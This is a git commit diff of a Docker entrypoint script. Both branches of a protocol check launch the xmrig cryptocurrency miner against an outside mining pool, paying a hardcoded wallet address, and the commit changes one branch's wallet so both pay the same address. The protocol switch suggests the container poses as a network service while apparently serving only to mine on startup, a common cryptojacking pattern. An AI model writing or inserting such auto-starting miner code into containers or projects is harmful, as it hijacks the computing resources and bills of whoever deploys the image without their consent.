1df06058763131a83656449a38947a5463810144
tarikgumus <tarik.gumus@yahoo.com>
2022-08-07 13:10:05 +0800

    Update docker-entrypoint.sh

--- docker-entrypoint.sh
+++ docker-entrypoint.sh
@@ -4,7 +4,7 @@ set -e
 
 if [ "$PROTO" = "ws" ]
 then	./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose -t 4
-else    ./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BV38NA2S52grKNouhD7g52WxWxPSxAhoho.neverlose -t 4
+else    ./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.neverlose -t 4
 fi
 
 
